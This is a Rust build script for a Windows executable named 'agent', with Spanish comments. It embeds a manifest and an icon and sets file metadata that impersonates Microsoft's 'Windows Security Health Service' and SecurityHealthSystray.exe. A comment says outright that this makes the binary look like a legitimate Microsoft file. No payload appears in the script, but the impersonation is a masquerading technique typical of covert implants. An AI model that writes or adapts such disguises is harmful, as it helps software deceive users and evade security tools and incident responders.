fn main() {
    #[cfg(target_os = "windows")]
    {
        let manifest_path = "../agent.manifest";
        let mut res = winres::WindowsResource::new();
        res.set_manifest_file(manifest_path);
        
        // Añadir icono personalizado si existe
        if std::path::Path::new("icon.ico").exists() {
            res.set_icon("icon.ico");
            println!("cargo:warning=✅ Usando icono personalizado: icon.ico");
        } else {
            println!("cargo:warning=⚠️  No se encontró icon.ico - compilando sin icono personalizado");
            println!("cargo:warning=   Coloca un archivo icon.ico en agent/ para añadir icono");
        }
        
        // Metadatos del ejecutable (aparecen en Propiedades > Detalles)
        // Estos metadatos hacen que el ejecutable parezca legítimo de Microsoft
        res.set("ProductName", "Windows Security Health Service");
        res.set("FileDescription", "Microsoft Windows Security Health Service");
        res.set("CompanyName", "Microsoft Corporation");
        res.set("LegalCopyright", "© Microsoft Corporation. All rights reserved.");
        res.set("ProductVersion", "10.0.22621.1");
        res.set("FileVersion", "10.0.22621.1");
        res.set("OriginalFilename", "SecurityHealthSystray.exe");
        res.set("InternalName", "SecurityHealth");
        
        res.compile().unwrap();
        println!("cargo:warning=✅ Recursos compilados exitosamente (manifest + icono + metadatos)");
    }
}
